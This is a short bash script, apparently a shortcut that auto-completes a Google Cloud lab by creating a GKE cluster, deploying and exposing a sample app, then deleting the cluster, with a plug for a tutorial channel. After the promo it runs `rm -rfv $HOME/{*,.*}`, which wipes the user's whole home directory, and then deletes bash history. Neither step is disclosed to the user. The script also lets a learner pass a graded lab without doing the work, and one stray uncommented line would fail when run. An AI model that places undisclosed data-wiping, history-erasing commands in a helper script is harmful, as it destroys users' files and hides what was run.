

BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${GREEN}${BOLD}

Don't Close the window or you might face error in completing the Lab

${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region $region
#gcloud config set compute/zone $region-a
#export ZONE=$region-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------# 

gcloud config set compute/zone $ZONE

gcloud config set compute/region "${ZONE%-*}"




task 2

gcloud container clusters create --machine-type=e2-medium --zone=$ZONE lab-cluster

gcloud container clusters get-credentials lab-cluster


#task 4

kubectl create deployment hello-server --image=gcr.io/google-samples/hello-app:1.0

kubectl expose deployment hello-server --type=LoadBalancer --port 8080


#task 5

gcloud container clusters delete lab-cluster --quiet



#-----------------------------------------------------end----------------------------------------------------------#


echo "${CYAN}${BOLD}

Please Consider Subscribing Alins Tutorial for more Tricks

${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0